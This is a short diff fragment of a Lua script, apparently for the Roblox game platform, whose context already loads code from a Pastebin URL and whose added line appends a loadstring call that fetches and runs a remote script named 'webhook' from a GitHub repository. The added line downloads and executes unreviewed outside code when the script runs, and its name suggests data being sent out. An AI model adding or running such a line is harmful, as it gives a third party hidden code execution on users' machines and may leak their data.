@@ -111,3 +111,5 @@ loadstring(game:HttpGet("https://pastebin.com/raw/ggsRCZD4", true))()
         TextBox.Text = ""
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Realjamkles/jamkles.lua/main/webhook", true))()
